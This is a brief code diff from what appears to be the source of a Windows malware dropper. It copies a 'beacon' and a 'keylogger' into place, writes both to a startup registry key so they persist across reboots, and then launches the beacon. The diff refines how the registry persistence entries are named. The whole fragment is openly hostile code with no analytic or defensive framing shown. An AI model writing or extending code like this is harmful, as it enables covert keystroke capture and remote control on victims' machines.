@@ -22,8 +22,8 @@ int main() {
     CopyFile(beacon_src_path, beacon_dst_path, FALSE);
     CopyFile(keylogger_src_path, keylogger_dst_path, FALSE);
 
-    write_to_startup_regkey(beacon_dst_path);
-    write_to_startup_regkey(keylogger_dst_path);
+    write_to_startup_regkey("beacon", beacon_dst_path);
+    write_to_startup_regkey("keylogger", keylogger_dst_path);
 
     return_val = run_command(beacon_dst_path);
     if (return_val != 0) {
